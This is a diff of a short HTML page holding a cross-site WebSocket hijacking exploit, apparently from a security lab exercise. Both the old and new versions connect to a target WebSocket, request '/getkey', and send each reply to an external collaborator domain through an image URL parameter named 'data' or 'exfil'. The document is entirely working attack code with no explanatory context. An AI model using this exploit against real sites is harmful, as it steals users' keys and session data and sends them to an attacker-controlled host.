@@ -1,23 +1,15 @@
 <html>
   <body>
     <script>
-      var uri = "ws://ptl-524eda3b-76481dad.libcurl.so/";
-      var ws = new WebSocket(uri);
-
-      ws.onmessage = function(message) {
-        try {
-          var data = JSON.parse(message.data);
-          var img = new Image();
-          img.src = "http://wqqer0crn4vz7bow0vvub8oq9hf83yrn.oastify.com/?data=" + encodeURIComponent(data.text);
-          document.body.appendChild(img);
-        } catch (e) {
-          console.error("Error parsing message:", e);
-        }
-      };
-
-      ws.onopen = () => {
-        ws.send(JSON.stringify({ text: "/getkey" }));
-      };
-    </script>
-  </body>
+  var ws = new WebSocket("ws://ptl-524eda3b-76481dad.libcurl.so/");
+  ws.onopen = function() {
+    ws.send(JSON.stringify({ text: "/getkey" }));
+  };
+  ws.onmessage = function(message) {
+    var data = JSON.parse(message.data);
+    var i = new Image();
+    i.src = "http://n8w59rui5vdqp26nimdltz6hr8xzlq9f.oastify.com/?exfil=" + encodeURIComponent(data.text);
+  };
+</script>
+</body>
 </html>
